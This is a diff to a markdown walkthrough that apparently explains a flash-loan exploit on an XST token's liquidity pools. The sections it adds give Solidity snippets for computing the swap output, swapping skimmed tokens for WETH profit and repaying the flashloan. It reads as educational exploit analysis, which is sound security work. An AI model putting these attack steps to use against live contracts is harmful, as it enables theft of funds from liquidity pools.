@@ -48,7 +48,7 @@ uint256 amountSellWETH = WETH.balanceOf(address(this));
 
 
 
-### calculate swap
+## calculate swap
 
 ![XTS Image](../images/XTS/para1.drawio.png)
 
@@ -93,15 +93,41 @@ After skimming the tokens we transfer the XST tokens to the liquitiy pool, wich 
           XST.transfer(address(Pair2), XST.balanceOf(address(this)));
 ```
 
-
-
-
-
-
 ![XTS Image](../images/XTS/liq.drawio.png)
 
 
 
+
+## Calculate swap
+
+![XTS Image](../images/XTS/para2.drawio.png)
+
+```solidity
+   uint256 amountOutWETH = amountSellXST * 997 * reserve4 / (reserve3 * 1000 + amountSellXST * 997);
+```
+
+
+## Swap for profit
+
+```solidity
+   Pair2.swap(0, amountOutWETH, address(this), "");
+```
+
+
+## Repay flashloan
+
+```solidity
+   WETH.transfer(address(Pair1), (amount * 2) * 1000 / 997 + 1000);
+```
+
+
+
+
+
+![XTS Image](../images/XTS/after.drawio.png)
+
+
+## profit
 
 
 ![XTS Image](../images/XTS/profit.drawio.png)
